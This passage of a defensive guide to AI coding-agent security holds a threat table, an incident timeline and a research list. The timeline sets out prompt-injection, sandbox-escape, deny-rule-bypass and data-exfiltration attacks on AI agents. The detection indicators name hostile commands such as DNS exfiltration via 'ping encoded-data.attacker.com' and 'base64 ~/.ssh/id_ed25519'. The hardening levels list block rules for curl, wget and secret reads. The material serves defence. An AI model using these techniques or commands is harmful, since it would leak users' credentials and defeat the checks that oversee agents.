| DNS exfiltration via ChatGPT | High | Hidden instructions in emails/PDFs encode data into DNS queries | [PointGuard AI: ChatGPT DNS Exfiltration (2026)](https://www.pointguardai.com/ai-security-incidents/chatgpt-prompt-injection-enables-silent-dns-data-exfiltration) |
| Command output capture | High | All bash output becomes conversation context sent to the API | Architectural — inherent to all LLM-based agents |
| Agent skill supply chain | Critical | 13.4% of audited agent skills contain critical security issues | [Snyk: ToxicSkills (Feb 2026)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) |
| Credential leakage via stdout | High | 75.8% of vulnerable agent skills leak credentials through log output | [arXiv:2604.03070 — Credential Leakage Study (Apr 2026)](https://arxiv.org/abs/2604.03070) |
| Sandbox escape via IPC | High | Chromium IPC flaw allows breaking out of sandbox | [CVE-2025-4609](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/) |
| Git hooks sandbox escape | High | Agent writes git hooks that execute outside sandbox | [CVE-2026-26268](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/) |
| Shell built-in allowlist bypass | High | `export`, `set`, `typeset` bypass command allowlists in Auto-Run Mode | [CVE-2026-22708 — Pillar Security](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors) |
| Open-folder autorun | High | Workspace Trust disabled by default — code runs on folder open | [Oasis Security: Cursor Autorun (Sep 2025)](https://www.oasis.security/blog/cursor-security-flaw) |
| Zero-click MCP injection | Critical | MCP config in repo auto-executes on project open, no interaction | [CVE-2026-30615 — Windsurf](https://nvd.nist.gov/vuln/detail/CVE-2026-30615) |
| Zero-click email injection | Critical | Crafted email triggers exfiltration without user interaction | [CVE-2025-32711 — EchoLeak](https://arxiv.org/abs/2509.10540) |
| Image-based prompt injection | Medium | Near-invisible text in images interpreted as LLM commands | [arXiv:2603.03637 — Image-based Prompt Injection (Mar 2026)](https://arxiv.org/abs/2603.03637) |
| Steganographic web injection | High | Zero-width fonts, CSS hiding, SVG encapsulation in web pages | [Unit 42: Web-Based IDPI in the Wild (Mar 2026)](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) |
| Cross-process env inheritance | Medium | Child processes inherit full environment including secrets | POSIX standard behavior — `fork()` copies env |
| Source code leak enabling targeted attacks | Medium | Leaked agent internals enable precision prompt injection | [Claude Code source leak (Mar 2026)](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know) |
| Context poisoning via repo config | Medium | Malicious `CLAUDE.md`/`.cursorrules` override agent behavior | [VentureBeat: 5 actions for security leaders (2026)](https://venturebeat.com/security/claude-code-512000-line-source-leak-attack-paths-audit-security-leaders) |
| Deny-rule bypass via command padding | High | >50 subcommands skip all deny-rule enforcement in Claude Code | [Adversa AI: Deny Rules Disabled (Apr 2026)](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/) |
| PR/issue comment injection | Critical | GitHub PR titles and comments hijack AI agents in GitHub Actions | [Comment and Control (Apr 2026)](https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/) |
| Image proxy exfiltration | High | Data encoded into signed Camo proxy URLs bypasses CSP | [CVE-2025-59145 — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/) |
| Memory persistence (SpAIware) | High | Malicious instructions persist in agent memory across sessions | [Embrace The Red: Windsurf SpAIware (2025)](https://embracethered.com/blog/posts/2025/windsurf-spaiware-exploit-persistent-prompt-injection/) |
| Agentic browser cookie reuse | High | Agents reuse cookies for requests, enabling cross-site data theft | [Trail of Bits: Agentic Browser Isolation (Jan 2026)](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) |
| CI/CD pipeline poisoning | Critical | AI triage bots exploited to publish malicious packages | [Clinejection — Snyk (Feb 2026)](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/) |
| Credential manager supply chain | Critical | Bitwarden CLI npm package trojanized via compromised GitHub Action, targeted AI tool API keys | [Bitwarden CLI Supply Chain Attack (Apr 2026)](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html) |
| Malware via AI tool lures | High | Fake "leaked" AI tool downloads distribute infostealers | [Trend Micro: Claude Code Lures (Apr 2026)](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html) |
| Unauthenticated RCE in AI framework endpoints | Critical | AI agent builder endpoints execute attacker-supplied code without sandboxing or auth | [Flowise CVE-2025-59528 (CVSS 10.0)](https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html) / [Langflow CVE-2026-33017 (CISA KEV)](https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html) |
| n-day Chromium/Electron vulnerabilities in forked IDEs | High | AI IDEs built on outdated VS Code/Electron inherit 94+ known browser CVEs; vendors slow to patch | [OX Security: Forked and Forgotten (Oct 2025)](https://www.ox.security/blog/94-vulnerabilities-in-cursor-and-windsurf-put-1-8m-developers-at-risk/) |
| Passive prompt injection via issue tracker | Critical | Hidden instructions in GitHub issues trigger Copilot agents to leak tokens and take over repos | [RoguePilot — Orca Security (Feb 2026)](https://orca.security/resources/blog/roguepilot-github-copilot-vulnerability/) |

## Real Incidents Timeline

### April 2026 — Bitwarden CLI Supply Chain Attack (Shai-Hulud)

The official Bitwarden CLI (`@bitwarden/cli@2026.4.0`) was trojanized for 93 minutes on April 22, 2026. Threat actor **TeamPCP** compromised a Checkmarx GitHub Action used in Bitwarden's CI pipeline — the first known compromise of npm's trusted publishing mechanism. The attacker didn't steal npm credentials; they poisoned an upstream GitHub Action so the legitimate CI pipeline published a malicious version on their behalf.

**Attack chain:** TeamPCP stole initial credentials from Aqua Security's Trivy (Feb 27, 2026) → compromised Checkmarx KICS and LiteLLM → used Checkmarx's own GitHub Actions to inject into Bitwarden's release workflow → published `@bitwarden/cli@2026.4.0` with a 10 MB obfuscated payload (`bw1.js`) triggered via a `preinstall` hook.

**Payload:** Seven parallel credential collectors targeting SSH keys, npm tokens, AWS/GCP/Azure credentials, cloud secrets managers, shell history, and **AI tool API keys** (Claude, Cursor, Codex CLI, Aider configs). Data encrypted with AES-256-GCM + RSA-OAEP and exfiltrated to `audit[.]checkmarx[.]cx/v1/telemetry` with a GitHub commit search API dead-drop as C2. The payload contained a **self-propagation worm** that used stolen npm tokens to re-publish compromised versions of the victim's own packages.

**Detection:** JFrog and Socket.dev identified the compromise independently. A version mismatch between `package.json` (2026.4.0) and embedded build metadata (2026.3.0) was a detectable signal. ~334 downloads during the 93-minute window.

Note: `rbw` (the unofficial Rust Bitwarden client installed via cargo/homebrew) was NOT affected — only the npm-distributed `@bitwarden/cli`. Distribution channel matters. See [Supply Chain Defense Guide](supply-chain-defense.md) for the full case study and defense checklist.

Source: [The Hacker News — Bitwarden CLI Compromised](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html) | [OX Security — Shai-Hulud Attack Analysis](https://www.ox.security/blog/shai-hulud-bitwarden-cli-supply-chain-attack/) | [Endor Labs — Shai-Hulud: The Third Coming](https://www.endorlabs.com/learn/shai-hulud-the-third-coming----inside-the-bitwarden-cli-2026-4-0-supply-chain-attack) | [Socket.dev — Bitwarden CLI Compromised](https://socket.dev/blog/bitwarden-cli-compromised)

### April 2026 — Three AI Agents Leak Secrets via "Comment and Control"

Security researchers demonstrated that Claude Code, Gemini CLI, and GitHub Copilot all leaked secrets through prompt injection in GitHub pull request titles and comments. The attack weaponizes GitHub Actions workflows — simply opening a PR or filing an issue auto-triggers the agent without victim interaction. Anthropic classified it as CVSS 9.4 Critical ($100 bounty). Google paid $1,337, GitHub $500.

Source: [VentureBeat — Three AI coding agents leaked secrets through a single prompt injection](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026)

### April 2026 — Claude Code .env File Exfiltration

Martin Paul Eve documented that Claude Code can consume, transmit, and compromise `.env` files even when explicitly instructed not to. Adding deny rules to `AGENTS.md` did not prevent the agent from reading secrets. The agent could circumvent restrictions by writing custom scripts or pipe chains.

Source: [Martin Paul Eve — Claude Code can consume, transmit, and compromise your .env files](https://eve.gd/2026/04/19/claude-code-can-consume-transmit-and-compromise-your-env-files-even-if-you-tell-it-not-to/)

### April 2026 — MCP SDK Systemic RCE (OX Security)

OX Security disclosed that Anthropic's MCP SDK architecture enables arbitrary command execution on any system running a vulnerable MCP implementation. 150M+ downloads, 200,000 vulnerable instances, 10 CVEs issued. Anthropic confirmed the behavior is by design and declined to modify the protocol.

Source: [OX Security — The Mother of All AI Supply Chains](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/)

### April 2026 — Claude Code Deny Rules Bypass (Adversa AI)

Adversa AI discovered that Claude Code silently disables deny-rule enforcement when a shell command contains more than 50 subcommands — a performance optimization that creates a security bypass. Attackers can embed 50 no-op commands followed by a credential-exfiltration payload. Patched April 6, 2026.

Source: [Adversa AI — Claude Code Security Bypass](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/)

### April 2026 — Flowise CVE-2025-59528 Actively Exploited (CVSS 10.0)

The CustomMCP node in Flowise passed the `mcpServerConfig` input directly to JavaScript's `Function()` constructor without validation, enabling unauthenticated remote code execution with full Node.js runtime privileges. An API token is the only prerequisite. VulnCheck's canary network detected active exploitation within days of disclosure; 12,000–15,000 Flowise instances are exposed to the public internet. CISA and Bleeping Computer confirmed active scanning. Fixed in Flowise v3.1.1.

Source: [The Hacker News — Flowise AI Agent Builder Under Active CVSS 10.0 RCE Exploitation](https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html) | [Security Affairs — CVE-2025-59528](https://securityaffairs.com/190471/security/attackers-exploit-critical-flowise-flaw-cve-2025-59528-for-remote-code-execution.html)

### April 2026 — Flowise CVE-2026-41264 (CSV Agent RCE via Prompt Injection)

Trend Micro's Zero Day Initiative disclosed that Flowise's CSV Agent node constructs and executes a Python script in a pyodide environment to analyze CSV column types. An unauthenticated attacker can send a crafted prompt that coerces the LLM into responding with a malicious Python script that executes attacker-controlled OS commands in the context of the Flowise server process. No authentication required. Fixed in Flowise v3.1.0 by disallowing all imports in the CSV Agent.

Source: [GitLab Advisory — CVE-2026-41264](https://advisories.gitlab.com/npm/flowise/CVE-2026-41264/) | [GitHub Advisory — GHSA-3hjv-c53m-58jj](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3hjv-c53m-58jj)

### April 2026 — Anthropic Claude Mythos + Project Glasswing

Anthropic announced Claude Mythos on April 7, 2026 — an AI model that during testing was found capable of identifying and exploiting zero-day vulnerabilities in every major operating system and web browser. Mythos Preview discovered thousands of high-severity zero-days including bugs 10–27 years old. In one demonstration it chained four vulnerabilities to escape both renderer and OS sandboxes. Project Glasswing deploys Mythos Preview in partnership with AWS, Apple, Cisco, CrowdStrike, Google, Linux Foundation, Microsoft, NVIDIA, and others to harden critical software before attackers find the same flaws. Mythos is not publicly available; Anthropic explicitly declined general access due to dual-use risk.

Source: [The Hacker News — Claude Mythos Finds Thousands of Zero-Day Flaws](https://thehackernews.com/2026/04/anthropics-claude-mythos-finds.html) | [Help Net Security](https://www.helpnetsecurity.com/2026/04/08/anthropic-claude-mythos-preview-identify-vulnerabilities/) | [Anthropic Project Glasswing](https://www.anthropic.com/glasswing)

### April 2026 — Claude Code Malware Lures (Trend Micro)

Within 24 hours of the March source code leak, threat actors pivoted to distributing Vidar stealer and GhostSocks proxy malware through fake "leaked" Claude Code downloads. 38 distinct 7z archives impersonating 25+ software brands. Active campaign since February 2026.

Source: [Trend Micro — Weaponizing Trust Signals](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html)

### March 2026 — Claude Code Source Code Leak

Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing 512,000 lines of TypeScript source code. The leak revealed the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags — giving attackers a detailed map for crafting targeted exploits.

Source: [VentureBeat — Claude Code's source code appears to have leaked](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know)

### March 2026 — Langflow CVE-2026-33017 Exploited in 20 Hours (CISA KEV)

Langflow's public flow build endpoint accepted attacker-supplied flow data containing arbitrary Python code in node definitions and executed it server-side without sandboxing — unauthenticated RCE in a single HTTP request (CVSS 9.3). Within 20 hours of disclosure on March 17, 2026, the Sysdig Threat Research Team observed real-world exploitation with no public PoC available, meaning attackers built working exploits directly from the advisory description. CISA added it to the Known Exploited Vulnerabilities catalog. Affects all Langflow versions prior to 1.8.1. Fixed in v1.9.0.

Source: [The Hacker News — Critical Langflow Flaw CVE-2026-33017](https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html) | [CISA via Help Net Security](https://www.helpnetsecurity.com/2026/03/27/cve-2026-33017-cve-2026-33634-exploited/) | [Sysdig — Exploited in 20 Hours](https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours)

### March 2026 — Unit 42 Web-Based IDPI in the Wild

Palo Alto Networks' Unit 42 published research documenting 22 distinct indirect prompt injection techniques found in real-world web content, including zero-sized fonts, off-screen positioning, and Base64-encoded runtime assembly. Real attacks included forcing Stripe payments and database deletion.

Source: [Unit 42 — Fooling AI Agents: Web-Based Indirect Prompt Injection](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)

### February 2026 — Check Point: Claude Code Hooks RCE and API Key Theft

Check Point Research disclosed CVE-2025-59536 (hooks injection, RCE) and CVE-2026-21852 (API key exfiltration via ANTHROPIC_BASE_URL redirect). Both exploited Claude Code's project-load flow through malicious repository configuration files.

Source: [Check Point Research — Caught in the Hook](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)

### February 2026 — Clinejection Supply Chain Attack

A single GitHub issue title triggered a chain that exfiltrated Cline's npm publishing tokens, resulting in unauthorized `cline@2.3.0` being published to npm. The malicious package installed OpenClaw on ~4,000 developer machines during an eight-hour window.

Source: [Adnan Khan — Clinejection](https://adnanthekhan.com/posts/clinejection/) | [Snyk — Clinejection Supply Chain Attack](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/)

### February 2026 — RoguePilot: GitHub Copilot Repository Takeover via Issues

Orca Security's research team discovered that malicious instructions embedded in a GitHub issue (hidden in HTML comments) could be processed by GitHub Copilot Agent, which in GitHub Codespaces had access to the repository's file system and terminal. Chaining issue injection with repository symlinks pointing to shared runtime files, an attacker could exfiltrate the `GITHUB_TOKEN` — granting full read and write access to the repository. Classified as a passive prompt injection supply chain attack: the attacker opens an issue, the victim never clicks anything. Patched by Microsoft.

Source: [Orca Security — RoguePilot](https://orca.security/resources/blog/roguepilot-github-copilot-vulnerability/) | [SecurityWeek — GitHub Issues Abused in Copilot Attack](https://www.securityweek.com/github-issues-abused-in-copilot-attack-leading-to-repository-takeover/) | [The Hacker News — RoguePilot](https://thehackernews.com/2026/02/roguepilot-flaw-in-github-codespaces.html)

### February 2026 — Snyk ToxicSkills Audit

Snyk audited 3,984 agent skills from ClawHub and skills.sh. Found 534 skills (13.4%) with critical issues, 1,467 (36.8%) with at least one security flaw, and 76 malicious payloads in markdown instructions — with 91% combining prompt injection with traditional malware.

Source: [Snyk — ToxicSkills: Malicious AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)

### January-April 2026 — OpenClaw Security Crisis

OpenClaw amassed 135,000+ GitHub stars and accumulated 138 CVEs over 63 days (~2.2/day), including CVE-2026-25253 (one-click RCE, CVSS 8.8). 135,000+ instances exposed to the public internet, 15,000+ directly vulnerable to RCE. 341 malicious skills confirmed in ClawHub (12% of registry).

Source: [Reco AI — OpenClaw Security Crisis](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now)

### January-February 2026 — Moltbook Platform Breach

The AI agent social network exposed 1.5M API tokens, 35,000 email addresses, and private messages through a misconfigured Supabase database. 506 prompt injections were found spreading through the agent network — a real-world example of cascading agent failure.

Source: [Wiz — Exposed Moltbook Database](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys) | [Fortune — Moltbook](https://fortune.com/2026/01/31/ai-agent-moltbot-clawdbot-openclaw-data-privacy-security-nightmare-moltbook-social-network/)

### January 2026 — Anthropic Git MCP Server Vulnerabilities

Three prompt injection vulnerabilities (CVE-2025-68143/68144/68145) in Anthropic's own official Git MCP server enabled arbitrary file access, file overwrites, and sandbox escape. Combined with the Filesystem MCP server, full RCE was achievable. Reported by Cyata in June 2025; fixed by Anthropic in December 2025.

Source: [The Hacker News — Three Flaws in Anthropic MCP Git Server](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html)

### December 2025 — IDEsaster: 30+ CVEs Across All AI IDEs

Security researcher Ari Marzouk disclosed IDEsaster — 30+ vulnerabilities (24 CVEs assigned) affecting Cursor, Windsurf, GitHub Copilot, Zed.dev, Roo Code, Junie, Cline, and Claude Code. 100% of tested AI IDEs were vulnerable. Universal attack chains affected every IDE tested.

Source: [The Hacker News — 30+ Flaws in AI Coding Tools](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html) | [MaccariTA — IDEsaster](https://maccarita.com/posts/idesaster/)

### December 2025 — Knostic: .env Secret Loading Without Permission

Knostic discovered that Claude Code automatically loads `.env` files without notifying the user. Any secrets stored in these files — API keys, proxy credentials, tokens — are silently loaded into memory and become part of the conversation context. The agent can then echo all secrets if given permission to run `echo`.

Source: [Knostic — Claude Code Automatically Loads .env Secrets, Without Telling You](https://www.knostic.ai/blog/claude-loads-secrets-without-permission)

### December 2025 — Knostic: Coding Agent Secret Leakage

Knostic published a broader analysis showing Claude Code and Cursor both mishandle `.env` secrets. In one case, a Cursor agent attempted to upload an unrelated local file to the cloud, sweeping up an API key without user authorization.

Source: [Knostic — From .env to Leakage: Mishandling of Secrets by Coding Agents](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage)

### October 2025 — Brave: Unseeable Prompt Injections in AI Browsers

Brave researchers demonstrated that Perplexity's Comet browser is vulnerable to low-contrast or near-invisible text in images that the AI interprets as commands. Summarizing a web page while logged into sensitive accounts could result in data theft.

Source: [Brave — Unseeable prompt injections in screenshots](https://brave.com/blog/unseeable-prompt-injections/)

### October 2025 — GitHub Copilot CamoLeak (CVE-2025-59145)

Hidden instructions in PR descriptions caused Copilot Chat to exfiltrate source code from private repositories through GitHub's Camo image proxy using pre-computed signed URLs. CVSS 9.6. Patched August 2025, disclosed October 2025.

Source: [BlackFog — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/)

### September 2025 — Cursor Open-Folder Autorun

Oasis Security discovered Cursor ships with Workspace Trust disabled by default, allowing `.vscode/tasks.json` to execute code the moment a developer opens a folder — no prompt, no consent.

Source: [Oasis Security — Cursor Open-Folder Autorun](https://www.oasis.security/blog/cursor-security-flaw)

### August 2025 — Cursor CurXecute and MCPoison

Two vulnerabilities disclosed: CVE-2025-54135 (CurXecute) enabled RCE via prompt injection through Cursor's agent. CVE-2025-54136 (MCPoison) demonstrated MCP server manipulation enabling unauthorized code execution.

Source: [Tenable — Cursor AI Code Editor Vulnerabilities](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)

### August 2025 — Cline DNS Exfiltration via Prompt Injection

Mindgard discovered that Cline could be coerced into exfiltrating API keys through DNS queries embedded in "safe" `ping` commands that required no user approval. A second vulnerability in `.clinerules` allowed overriding the approval flag for all commands. Disclosed August 2025.

Source: [Mindgard — Cline Data Exfiltration](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns)

### July 2025 — Gemini CLI Silent Code Execution

Two days after Gemini CLI's release, Tracebit discovered the allow-list mechanism was improperly implemented, enabling silent code execution through prompt injection. Patched in v0.1.14 on July 25, 2025.

Source: [Tracebit — Gemini AI CLI Hijack](https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack) | [CyberScoop — Google patches Gemini CLI](https://cyberscoop.com/google-gemini-cli-prompt-injection-arbitrary-code-execution/)

### May-June 2025 — EchoLeak: First Zero-Click AI Agent Attack (CVE-2025-32711)

A crafted email triggered data exfiltration from Microsoft 365 Copilot without any user interaction — the first known zero-click attack on an AI agent. Chained XPIA classifier bypass, link redaction circumvention, auto-fetched images, and Teams proxy abuse. CVSS 9.3. Patched by Microsoft server-side in May 2025.

Source: [arXiv:2509.10540 — EchoLeak](https://arxiv.org/abs/2509.10540)

### May 2025 — Windsurf Data Exfiltration (Embrace The Red)

Embrace The Red documented that Windsurf's `read_url_content` tool (no approval required) can serve as a data exfiltration channel, and image rendering from untrusted sources enables data theft. Also demonstrated SpAIware — persistent memory poisoning surviving across sessions. Disclosed May 30, 2025; fixes unconfirmed.

Source: [Embrace The Red — Windsurf Data Exfiltration](https://embracethered.com/blog/posts/2025/windsurf-data-exfiltration-vulnerabilities/)

### April 2025 — Simon Willison: MCP Prompt Injection

Simon Willison documented that MCP has fundamental prompt injection security problems — tool descriptions are untrusted input that gets injected into the LLM context, with no reliable way to distinguish them from trusted instructions.

Source: [Simon Willison — Model Context Protocol has prompt injection security problems](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)

### 2025 — Invariant Labs: MCP Tool Poisoning

Invariant Labs demonstrated that malicious MCP servers can poison tool descriptions to exfiltrate data from trusted servers. They showed a rug-pull attack where a tool passed initial review, then changed its description on the second launch to include exfiltration instructions.

Source: [Invariant Labs — MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)

---

## Vibe Coding Security Debt

AI-generated code introduces vulnerabilities at scale. Georgia Tech's [Vibe Security Radar](https://news.research.gatech.edu/2026/04/13/bad-vibes-ai-generated-code-vulnerable-researchers-warn) project tracks CVEs attributable to AI coding tools:

| Period | CVEs Confirmed | Notes |
|--------|---------------|-------|
| All of 2025 | < 35 | Baseline |
| January 2026 | 6 | Early tracking |
| February 2026 | 15 | Growing trend |
| March 2026 | 35 | More than all of 2025 combined |
| **Total confirmed** | **74** | Floor estimate; true count projected at 400-700 |

Claude Code accounts for 27 of 74 confirmed CVEs (36%) — partly because it leaves identifying signatures in commits. Tools like GitHub Copilot leave no trace, making attribution impossible.

**Key statistics from the CSA ([Cloud Security Alliance, April 2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-generated-code-vulnerability-surge-2026/)):**
- 40-62% of AI-generated code contains vulnerabilities
- AI-assisted developers produce commits at 3-4x rates but introduce security findings at 10x rates
- 86% failure rate defending against XSS vulnerabilities
- ~20% of samples reference non-existent packages (dependency hallucination)
- Most common CWEs: CWE-862 (missing authorization), CWE-798 (hardcoded credentials), CWE-89 (SQL injection)

---

## Research Papers

| Paper | Date | Key Finding |
|-------|------|-------------|
| [Prompt Injection Attacks on Agentic Coding Assistants](https://arxiv.org/abs/2601.17548) (Maloyan & Namiot) | Jan 2026 | 42 attack techniques identified; attack success >85% against state-of-the-art defenses; most defenses achieve <50% mitigation |
| [EchoLeak: First Zero-Click Prompt Injection](https://arxiv.org/abs/2509.10540) | Sep 2025 | First zero-click exploit on production LLM system (Microsoft 365 Copilot, CVE-2025-32711) |
| [Image-based Prompt Injection](https://arxiv.org/abs/2603.03637) | Mar 2026 | 64% attack success via typographic injection against GPT-4V, Claude 3, Gemini in black-box settings |
| [Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837) | Jun 2025 | Principled design patterns for provable resistance to prompt injection with utility/security trade-off analysis |
| [VIGIL: Verify-Before-Commit Defense](https://arxiv.org/abs/2601.05755) | Jan 2026 | Proposes verify-before-commit paradigm to reconcile security with reasoning flexibility |
| [Credential Leakage in LLM Agent Skills](https://arxiv.org/abs/2604.03070) | Apr 2026 | 17,022 skills analyzed; 520 vulnerable with 1,708 issues; 10 leakage patterns; stdout leakage affects 75.8% |
| [Agent Skills in the Wild](https://arxiv.org/abs/2601.10338) | Jan 2026 | Large-scale empirical study of security vulnerabilities in agent skills at scale |
| [AgentLeak: Privacy Leakage in Multi-Agent Systems](https://arxiv.org/abs/2602.11510) | Feb 2026 | Full-stack benchmark for privacy leakage across multi-agent LLM systems |
| [MASpi: Multi-Agent Prompt Injection Evaluation](https://openreview.net/forum?id=1khmNRuIf9) | 2025 | Unified environment evaluating prompt injection across external inputs, agent profiles, and inter-agent messages |
| [Multi-Agent LLM Defense Pipeline](https://arxiv.org/abs/2509.14285) | Sep 2025 | 100% mitigation of 400 attack instances across 8 categories using multi-agent defense pipeline |
| [Multimodal Prompt Injection Attacks](https://arxiv.org/abs/2509.05883) | Sep 2025 | Comprehensive analysis of risks and defenses for multimodal LLM prompt injection |
| [Security Considerations for Multi-agent Systems](https://arxiv.org/abs/2603.09002) | Mar 2026 | Analyzes security threats specific to multi-agent architectures |
| [Prompt Injection: Comprehensive Review](https://www.mdpi.com/2078-2489/17/1/54) (MDPI) | Jan 2026 | 45 sources synthesized; taxonomy of injection techniques from 2023-2025 |
| [MCP Threat Modeling: Prompt Injection and Tool Poisoning](https://arxiv.org/abs/2603.22489) | Mar 2026 | STRIDE/DREAD analysis across 5 MCP components; 7 client defenses compared; tool poisoning identified as most prevalent attack; most clients fail static validation |
| [Are AI-assisted Development Tools Immune to Prompt Injection?](https://arxiv.org/abs/2603.21642) | Mar 2026 | Empirical analysis of AI coding tools' resistance to prompt injection; published in time for IEEE S&P 2026 |
| [Breaking MCP with Function Hijacking Attacks](https://arxiv.org/abs/2604.20994) | Apr 2026 | Novel FHA attack forces agents to invoke attacker-chosen MCP tools; 70–100% ASR across 5 models including GPT-5 and Claude Sonnet 4; attack is agnostic to context semantics |

**Industry reports:**
- [Trail of Bits — Lack of Isolation in Agentic Browsers (January 2026)](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) — Prompt injection in AI browsers mirrors XSS/CSRF; agents lack Same-Origin Policy equivalents
- [NCC Group Annual Cyber Security Research Report 2025](https://www.nccgroup.com/newsroom/ncc-group-publishes-its-annual-cyber-security-research-report-2025-highlighting-breakthroughs-across-ai-security-cryptography-and-cyber-physical-risk/) — Highlights real-time deepfake vishing, prompt injection, unsafe agentic AI, and "shadow AI" as expanding risks
- [Palo Alto Unit 42 — Web-Based IDPI in the Wild (March 2026)](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) — 22 real-world injection techniques documented from production detection telemetry
- [Brave — Unseeable Prompt Injections (October 2025)](https://brave.com/blog/unseeable-prompt-injections/) — Near-invisible text in images and screenshots exploiting AI browsers

---

## Detection Indicators

What to look for in audit logs and system monitoring that suggests an agent has been compromised or is behaving unexpectedly:

### Network Indicators
- **Unexpected outbound HTTP/HTTPS requests** — Agent making requests to domains not in your project's dependencies, especially to unfamiliar IPs or URL shorteners
- **DNS queries with encoded data** — Unusually long subdomain labels in DNS queries (Base32/Base64 encoded data in `*.attacker.com`)
- **Image requests to untrusted domains** — 1x1 pixel fetches or image requests to domains outside your normal set (CamoLeak-style exfiltration)
- **Requests via trusted proxies** — Data exfiltration routed through GitHub Camo, Slack unfurlers, or other trusted infrastructure to bypass CSP

### File System Indicators
- **Shell config modifications** — Changes to `.bashrc`, `.zshrc`, `.profile` not made by you
- **New or modified git hooks** — Files appearing in `.git/hooks/` without your knowledge
- **New MCP configuration files** — `.claude/settings.json`, `.cursor/mcp.json`, or similar appearing in cloned repos
- **Modified CI/CD configs** — Changes to `.github/workflows/`, `Makefile`, or npm scripts
- **Unexpected `.clinerules` or `.cursorrules` directories** — Configuration overrides in repos you cloned

### Agent Behavior Indicators
- **Unusually long shell commands** — Commands with 50+ subcommands joined by `&&` or `;` (deny-rule bypass attempts)
- **Environment variable reads** — Agent running `printenv`, `env`, `echo $SECRET`, or `cat .env` without being asked
- **Curl/wget to unfamiliar endpoints** — Any outbound data transmission not part of the current task
- **Ping commands with suspicious hostnames** — DNS exfiltration via `ping encoded-data.attacker.com`
- **Base64 encoding of file contents** — `base64 ~/.ssh/id_ed25519` or similar encoding operations
- **Package installations you did not request** — `npm install`, `pip install`, or `cargo add` with packages you do not recognize

### Process Indicators
- **Background processes spawned by the agent** — Check for persistent processes after agent sessions end
- **Cron jobs or scheduled tasks** — New entries in `crontab -l` or launchd plists
- **Modified PATH or aliases** — New aliases or PATH entries that shadow legitimate commands

---

## Agent Security Maturity Model

A progressive framework for hardening your solo dev setup. Start at Level 1 and work upward.

### Level 1: Basic Hooks (1 hour)

You have installed PreToolUse hooks that block known-dangerous patterns.

- Block `curl`/`wget` to untrusted domains
- Deny reads of `.env`, `~/.ssh/`, `~/.aws/`
- Block writes to shell config files (`.bashrc`, `.zshrc`)
- Block writes to `.git/hooks/`
- Log all tool invocations to a local file

**You are protected against:** Opportunistic exfiltration, accidental secret exposure, basic shell config modification.

**You are NOT protected against:** Sophisticated encoding (Base64, DNS), sandbox escapes, MCP poisoning, approval fatigue.

### Level 2: Restricted Permissions + Audit (half day)

You have narrowed the agent's permissions and enabled comprehensive logging.

- Never use `--dangerously-skip-permissions` or YOLO mode
- Enable Workspace Trust in Cursor
- Use command allowlists instead of blocklists
- Pin MCP server versions (no auto-updates)
- Audit `CLAUDE.md` / `.cursorrules` / `.windsurfrules` in every cloned repo before opening with your agent
- Review agent audit logs weekly
- Enable file-level deny rules for sensitive directories

**You are protected against:** Auto-approved malicious commands, rug-pull MCP updates, context poisoning via repo configs.

**You are NOT protected against:** Zero-click exploits, DNS exfiltration via "safe" commands, shell built-in bypasses.

